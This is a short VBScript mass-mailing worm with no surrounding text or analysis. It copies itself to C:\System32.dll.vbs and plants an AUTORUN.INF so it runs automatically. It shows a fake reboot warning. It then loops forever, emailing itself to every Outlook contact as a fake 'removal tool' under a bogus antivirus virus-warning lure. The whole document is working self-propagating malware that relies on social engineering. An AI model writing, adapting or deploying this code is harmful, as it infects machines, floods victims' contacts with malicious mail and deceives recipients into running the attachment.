dim filesys
set filesys=CreateObject("Scripting.FileSystemObject")
Set ANTI = CreateObject("Scripting.FileSystemObject")
Set NOTEPAD = anti.CreateTextFile("C:\AUTORUN.INF")
Set fs = createobject("scripting.filesystemobject")
fs.CopyFile Wscript.ScriptFullName, ("C:\System32.dll.vbs")
NOTEPAD.writeline "[Autorun]"
NOTEPAD.writeline "open=System32.dll.vbs"
NOTEPAD.close
msgbox"Please reboot computer immediately !",vbCritical,"WARNING"
do
Set aa = CreateObject("Outlook.Application")
Set bb = Wscript.CreateObject("Outlook.Application")
Set mapi = bb.GetNameSpace("MAPI")
Set c = mapi.AddressLists(1)
For X = 1 To c.AddressEntries.Count
Set Mail = aa.CreateItem(0)
Mail.to = aa.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
Mail.Subject = "Virus warning"
Mail.Body = "W32.Beagle.V@mm worm detected at your mailbox"
Mail.Body = "Please execute attached removal tool immediately !"
Mail.Body = ""
Mail.Body = "This mail was sent by united antivirus developers community."
Mail.Attachments.Add WScript.ScriptFullName
Mail.Send
next
loop

